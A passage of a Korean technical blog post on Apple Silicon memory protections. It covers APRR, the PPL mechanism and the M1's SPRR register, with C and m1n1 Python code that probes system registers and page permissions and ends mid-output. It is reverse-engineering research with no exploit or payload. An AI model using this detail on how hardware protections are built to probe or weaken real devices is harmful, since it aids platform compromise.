href="#Just-In-Time-컴파일러" class="headerlink" title="Just-In-Time 컴파일러"></a>Just-In-Time 컴파일러</h2><p>보통 애플리케이션은 고수준 언어에서 기계 코드로 컴파일된 후 배포된다. 코드는 런타임 중에 수정되지 않아 <code>r-x</code>로 매핑할 수 있다.</p><p>하지만 JIT 컴파일러는 동적으로 기계 코드를 생성하므로 이를 위해 새 코드를 작성한 후 실행할 수 있도록 메모리 영역을 <code>rwx</code>로 매핑해야 한다.</p><p>애플은 아이폰에서 CPU가 보증된 명령만 실행하길 원했으므로 이런 매핑을 원하지 않았다. 모든 애플리케이션이 <code>rxw</code> 매핑을 요청하면 해당 애플리케이션이 원하는 명령을 실행할 수 있으므로 전체적인 보호 동작이 무의미해진다. 일부 애플리케이션만 이러한 매핑 권한이 있어도 <code>rxw</code> 매핑에 shellcode를 작성하여 악용의 대상이 될 수 있다.(<code>rxw</code> 영역을 찾아 arbitrary write 후 jump gadget을 찾는 것은 어렵겠지만)</p><p>하지만 자바스크립트가 있으므로 애플은 JIT 컴파일러가 필요하다.</p><p>이 문제는 APRR로 해결할 수 있다. 특정 유저 랜드 애플리케이션(iOS의 사파리, macOS의 모든 애플리케이션)은 <code>rw-</code>와 <code>r-x</code>를 빠르게 전환할 수 있는 특수 메모리 영역(<code>[MAP_JIT</code> 플래그를 통한 <code>mmap</code>, <code>pthread_jit_write_protect_np</code>](<a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))%EC%9D%84">https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon))을</a> 요청할 수 있다. 여기서 APRR 레지스터 내부의 2 비트를 수정하여 JIT 페이지에 <code>w</code> 대신 <code>x</code>를 제거하여 모든 페이지를 <code>rw-</code>에서 <code>r-x</code>로 수정한다.(혹은 그 반대로 동작)</p><h2 id="페이지-보호-계층-Page-Protection-Layer"><a href="#페이지-보호-계층-Page-Protection-Layer" class="headerlink" title="페이지 보호 계층(Page Protection Layer)"></a>페이지 보호 계층(Page Protection Layer)</h2><p>애플은 가능한 한 모든 실행 가능한 페이지에 code signing을 요구한다. iOS에서는 애플에서 이 서명을 가져와야 하고 macOS에서는 로컬로 생성할 수 있는 ad-hoc(임시) 서명이 있다. Code signing은 보통 커널에 의해 시행된다. 커널은 디바이스 드라이버 같은 코드를 많이 가지고 있으므로 attack surface가 굉장히 크다. 모든 드라이버의 모든 버그는 code signing을 우회할 수 있다. 이러한 이슈는 오래전 비디오 게임 콘솔 <a href="https://free60project.github.io/wiki/Hypervisor/">마이크로소프트 Xbox 360 하이퍼바이저</a>에서 해결되었다. 모든 커널 코드에 exploitable 한 버그가 존재하는지 확인하는 대신에 하이퍼바이저 자체에 버그가 있는지만 확인하면 된다.</p><p>비슷하게 애플은 커널 내부에 매우 낮은 오버헤드를 가진 하이퍼바이저를 생성하기 위해 APRR을 사용한다. 첫 번째로 페이지 테이블(중요한 데이터 구조를 가진 메모리)과 권한 코드 섹션 PPL을 커널 자체에 읽기 전용으로 매핑한다. <a href="https://ko.wikipedia.org/wiki/%ED%8A%B8%EB%9E%A8%ED%8E%84%EB%A6%B0_(%EC%BB%B4%ED%93%A8%ED%8C%85)">trampoline</a> 함수는 APRR을 사용하여 페이지 테이블을 <code>rw-</code>로 다시 매핑하고 PPL 코드를 <code>r-x</code>로 매핑한 후 점프한다. 이 trampoline 함수는 PPL 코드의 유일한 엔트리 포인트이므로 hypercall 명령어처럼 동작하며 PPL 자체는 오버 헤드가 매우 낮은 하이퍼바이저처럼 동작한다.</p><p>상세한 내용은 <a href="http://newosxbook.com/articles/CasaDePPL.html">Jonathan의 Casa De P(a)P(e)L write up</a>에서 확인할 수 있다.</p><h1 id="SPRR"><a href="#SPRR" class="headerlink" title="SPRR"></a>SPRR</h1><h2 id="Userland-JIT"><a href="#Userland-JIT" class="headerlink" title="Userland JIT"></a>Userland JIT</h2><p>애플 실리콘의 JIT은 <code>rw-</code>와 <code>r-x</code> 권한을 빠르게 전환하기 위해 특수한 영역을 할당받는다. 이전 SoC에서 APRR을 사용하여 시행되었다.</p><p><a href="https://developer.apple.com/documentation/apple-silicon/porting-just-in-time-compilers-to-apple-silicon">Just-in-Time 컴파일러에 대한 애플의 공식 문서</a>에서 M1에서 이러한 전환은 여전히 <code>_pthread_jit_write_protect_np</code> 함수가 수행함을 알 수 있다. <code>otool -xv /usr/lib/system/libsystem_pthread.dylib</code>을 통해 어떠한 동작을 하는지 확인해보자.</p><pre><code class="hljs apache"><span class="hljs-attribute">_pthread_jit_write_protect_np</span>:[...]<span class="hljs-attribute">0000000000007fdc</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xc<span class="hljs-number">118</span><span class="hljs-attribute">0000000000007fe0</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xffff, lsl #<span class="hljs-number">16</span><span class="hljs-attribute">0000000000007fe4</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xf, lsl #<span class="hljs-number">32</span><span class="hljs-attribute">0000000000007fe8</span>        movk    x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span>, lsl #<span class="hljs-number">48</span><span class="hljs-attribute">0000000000007fec</span>        ldr     x<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]                ; Latency: 4</span><span class="hljs-meta">0000000000007ff0        msr     S3_6_C15_C1_5, x0</span><span class="hljs-meta">0000000000007ff4        isb</span><span class="hljs-meta">[...]</span></code></pre><p>주소 <code>0xffffc118</code>에서 64비트 정수를 로드한 후 <code>s3_6_c15_c1_5</code> 시스템 레지스터에 작성한다. <code>0xffffc110</code>에서 새로운 시스템 레지스터 값을 로드하는 비슷한 코드가 더 있다. 이 주소들은 모든 유저 랜드 프로세스에 매핑되고 커널이 유저 랜드에 전달하는 많은 변수를 포함한 commpage 영역이다.</p><p>오픈 소스 XNU 코드에는 commpage 내부에 이 변수들을 설정하는 코드가 없지만 이전 세대 APRR에 사용된 <code>cp_aprr_shadow_jit_rw</code>에 대한 참조 코드가 남아있다.</p><p>이 C 프로그램을 덤프 해보자</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">uint64_t</span> *sprr = (<span class="hljs-keyword">uint64_t</span> *)<span class="hljs-number">0xfffffc110</span>;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx %llx\n&quot;</span>, sprr[<span class="hljs-number">0</span>], sprr[<span class="hljs-number">1</span>]);&#125;</code></pre><p><code>0x2010000030300000</code>과 <code>0x2010000030100000</code> 값을 통해 JIT 페이지의 <code>r-x</code>와 <code>rw-</code> 권한을 전환한다. 이는 APRR과 유사하지만 다른 레지스터를 사용하며 다른 magic number를 포함한다.</p><p>SPRR에 대한 대략적인 아이디어를 통해 커널을 disassemble 하고 이 레지스터나 근처 레지스터를 사용하는 함수를 찾을 수 있다.</p><p>우리가 찾은 레지스터에서 비트를 수정하고 어떻게 작동하는지 확인하자. M1에서 실행되는 일반 유저 랜드 프로그램에서도 가능하다.</p><p>모든 비트를 0과 1로 설정</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) &#123;        write_sprr(<span class="hljs-number">1U</span>LL&lt;&lt;i);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bit %02d: %016llx\n&quot;</span>, i, read_sprr());    &#125;</code></pre><p>commpage에서 찾은 두 값이 다른 두 비트를 제외한 모든 비트가 initial value로 잠겼다. 이를 통해 JIT 페이지 권한과 관련이 있음을 알 수 있다. <code>mmap</code>을 사용하여 페이지를 매핑할 수 있다. 읽기나 쓰기가 보호된 페이지를 읽거나 쓰면 <code>SIGBUS</code>가 발생하고 실행 권한이 없는 페이지로 점프하면 <code>SIGSEV</code>가 발생한다. signal handler를 통해 유저 랜드 애플리케이션에서 이러한 signal을 확인할 수 있다.</p><p>보호된 페이지에 접근하기 위해 <code>x0</code>을 magic constant로 설정한 signal handler를 설정하고 return 되기 전에 프로그램 카운터를 증가시킨다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;</code></pre><p>실행 권한이 없는 페이지를 실행하는 것도 비슷한 방법으로 하면 된다. 프로그램 카운터를 링크 레지스터로 설정하고 callee로 돌아가 magic value를 <code>x0</code>에 저장한다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;</code></pre><p>이제 <code>MAP_JIT</code>으로 페이지를 매핑하고 시스템 레지스터에 모든 4개의 가능한 값을 메모리 읽기 혹은 쓰기를 실행한다.</p><ul><li><p>SPRR JIT test code</p>  <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _XOPEN_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/utsname.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ucontext.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;ldr x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;str x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr + <span class="hljs-number">8</span>)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> (*fun_ptr)(<span class="hljs-keyword">uint64_t</span>) = ptr;    <span class="hljs-keyword">uint64_t</span> res = fun_ptr(<span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sprr_test</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> a, b;    a = read_sprr_perm();    write_sprr_perm(v);    b = read_sprr_perm();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx: %c%c%c\n&quot;</span>, b, can_read(ptr) ? <span class="hljs-string">&#x27;r&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>, can_write(ptr) ? <span class="hljs-string">&#x27;w&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>,           can_exec(ptr) ? <span class="hljs-string">&#x27;x&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">make_sprr_val</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> nibble)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)        res |= ((<span class="hljs-keyword">uint64_t</span>)nibble) &lt;&lt; (<span class="hljs-number">4</span> * i);    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)argc;    (<span class="hljs-keyword">void</span>)argv;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span>    sigfillset(&amp;sa.sa_mask);    sa.sa_sigaction = bus_handler;    sa.sa_flags = SA_RESTART | SA_SIGINFO;    sigaction(SIGBUS, &amp;sa, <span class="hljs-number">0</span>);    sa.sa_sigaction = sev_handler;    sigaction(SIGSEGV, &amp;sa, <span class="hljs-number">0</span>);    <span class="hljs-keyword">uint32_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);    write_sprr_perm(<span class="hljs-number">0x3333333333333333</span>);    ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0xd65f03c0</span>; <span class="hljs-comment">// ret</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)        sprr_test(ptr, make_sprr_val(i));&#125;</code></pre></li></ul><p>다음과 같은 결과 테이블이 주어진다.</p><table><thead><tr><th>레지스터 값</th><th>페이지 권한</th></tr></thead><tbody><tr><td>00</td><td><code>---</code></td></tr><tr><td>01</td><td><code>r-x</code></td></tr><tr><td>10</td><td><code>r--</code></td></tr><tr><td>11</td><td><code>rw-</code></td></tr></tbody></table><p>APRR의 동작 방식보다 훨씬 단순하다. 두 개의 레지스터를 사용하여 첫 권한을 설정하고 다른 레지스터를 마스킹하는 대신에 4개의 값 중 하나로만 수정할 수 있다. APRR은 userspace에 <code>rxw</code> 매핑을 생성할 수 있는 해킹 방법이 존재하였는데, 이를 인코딩하는 방법이 없으므로 불가능하다. 시스템 레지스터의 다른 바이트들은 페이지 테이블 엔트리에 인코딩 된 16개의 다른 사용 권한일 수도 있다. 그러면 시스템 레지스터의 나머지는 알 수 없겠는걸</p><p>이제 새로운 하드웨어 기능의 동작 방식에 대해 살펴보자.</p><p>애플의 하이퍼바이저 프레임워크를 사용하여 EL1에서 코드를 실행하여 SPRR이 어떻게 동작하는지 확인하고 싶었지만, SPRR과 연관된 레지스터에 접근하면 오류가 발생했다. 대신에 베어 메탈(bare metal)을 통해 EL2에서 코드를 실행하자.</p><h2 id="m1n1"><a href="#m1n1" class="headerlink" title="m1n1"></a>m1n1</h2><p>이전 아이폰 해커들은 XNU을 정적 리버싱 하거나 exploit 하기 위해 EL1까지 가는 과정을 실험했다. 하지만 M1은 많은 하드웨어 기능을 공유하며 부트 프로세스에서 서명되지 않은 코드를 실행할 수 있다.</p><p>M1에 대한 upstream linux 지원을 목표로 하는 Asahi Linux project의 일부로 m1n1이라 불리는 작은 부트로더/하드웨어 플랫폼이 개발되었다. m1n1은 XNU와 동시에 제어 권한을 갖는다. 아래의 모든 작업은 EL2에서 실행할 수 있는 shellcode로 작성할 수 있지만 m1n1을 사용하여 진행한다.</p><h2 id="Python에서-알-수-없는-시스템-레지스터-발견"><a href="#Python에서-알-수-없는-시스템-레지스터-발견" class="headerlink" title="Python에서 알 수 없는 시스템 레지스터 발견"></a>Python에서 알 수 없는 시스템 레지스터 발견</h2><p>m1n1은 shellcode를 컴파일하고 로드하고 데이터 추출을 핸들링하는 등 이러한 모든 세부 사항을 파이썬 쉘에서 직접 하드웨어를 조작할 수 있다. 또 최근 필자의 USB 가젯 코드를 병합하여 m1 MAC과 일반 USB 케이블만으로 테스트할 수 있다.</p><p><code>proxyclient/shell.py</code>를 실행하자. 유저 랜드 SPRR 레지스터에 접근하면 예외가 발생한다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))TTY&gt; Exception: SYNCTTY&gt; Exception taken <span class="hljs-keyword">from</span> EL2hTTY&gt; Running <span class="hljs-keyword">in</span> EL2TTY&gt; MPIDR: <span class="hljs-number">0x80000000</span>TTY&gt; Registers: (@<span class="hljs-number">0x8046b3db0</span>)TTY&gt;   x0-x3: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span>TTY&gt;   x4-x7: <span class="hljs-number">0000000810</span>cb8000 <span class="hljs-number">0000000000007</span>a69 <span class="hljs-number">0000000804630004</span> <span class="hljs-number">0000000804630000</span>TTY&gt;  x8-x11: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000000</span>ffffffc8 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">000000000000002</span>cTTY&gt; x12-x15: <span class="hljs-number">0000000000000003</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000008046</span>b3b20TTY&gt; x16-x19: <span class="hljs-number">00000008045</span>caa80 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">000000080462</span>b000TTY&gt; x20-x23: <span class="hljs-number">00000008046</span>b3f78 <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">0000000000000002</span> <span class="hljs-number">00000008046</span>b3f98TTY&gt; x24-x27: <span class="hljs-number">00000008046</span>b3f70 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000001</span>TTY&gt; x28-x30: <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">00000008045</span>bad90TTY&gt; PC:       <span class="hljs-number">0x810cb8000</span> (rel: <span class="hljs-number">0xc70c000</span>)TTY&gt; SP:       <span class="hljs-number">0x8046b3eb0</span>TTY&gt; SPSR_EL1: <span class="hljs-number">0x60000009</span>TTY&gt; FAR_EL1:  <span class="hljs-number">0x0</span>TTY&gt; ESR_EL1:  <span class="hljs-number">0x2000000</span> (unknown)TTY&gt; L2C_ERR_STS: <span class="hljs-number">0x11000ffc00000000</span>TTY&gt; L2C_ERR_ADR: <span class="hljs-number">0x0</span>TTY&gt; L2C_ERR_INF: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_LSU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_FED_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_MMU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; Recovering <span class="hljs-keyword">from</span> exception (ELR=<span class="hljs-number">0x810cb8004</span>)Traceback (most recent call last):  File <span class="hljs-string">&quot;/opt/homebrew/Cellar/python@3.9/3.9.4/Frameworks/Python.framework/Versions/3.9/lib/python3.9/code.py&quot;</span>, line <span class="hljs-number">90</span>, <span class="hljs-keyword">in</span> runcode    exec(code, self.locals)  File <span class="hljs-string">&quot;&lt;console&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;  File <span class="hljs-string">&quot;/Users/speter/asahi/git/m1n1/proxyclient/utils.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> mrs    <span class="hljs-keyword">raise</span> ProxyError(<span class="hljs-string">&quot;Exception occurred&quot;</span>)proxy.ProxyError: Exception occurred&gt;&gt;&gt;</code></pre><p>커널은 컨텍스트 전환 중에 이 레지스터를 수정할 수 있어야 한다. 이는 enable bit가 있음을 의미하며 m1n1 repository에 사용 가능한 시스템 레지스터를 찾는 파이썬 툴이 있다. 내부적으로 모든 명령에 대해 mrs 명령을 생성하고 정의되지 않은 레지스터로 이한 예외를 복구한다. 그것을 실행하여 근처의 레지스터를 찾는다.</p><pre><code class="hljs python">$ python3 proxyclient/find_all_regs.py | grep s3_6_c15_c1_s3_6_c15_c1_0 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_2 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_4 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>) = <span class="hljs-number">0x0</span></code></pre><p>MMU를 비활성화하고 각 레지스터에 모든 레지스터를 작성하고, 레지스터를 다시 찾아서 새로운 레지스터를 식별한다. 이것은 몇 줄의 파이썬 코드로 수행할 수 있다.</p><pre><code class="hljs python"><span class="hljs-keyword">with</span> u.mmu_disabled():    <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> [(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)]:        old_regs = find_regs()        u.msr(reg, <span class="hljs-number">1</span>)        new_regs = find_regs()        diff_regs = new_regs - old_regs        print(reg)        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(diff_regs):            print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-number">0</span>)    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</code></pre><ul><li><p>활성화된 시스템 레지스터</p>  <pre><code class="hljs python">(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span 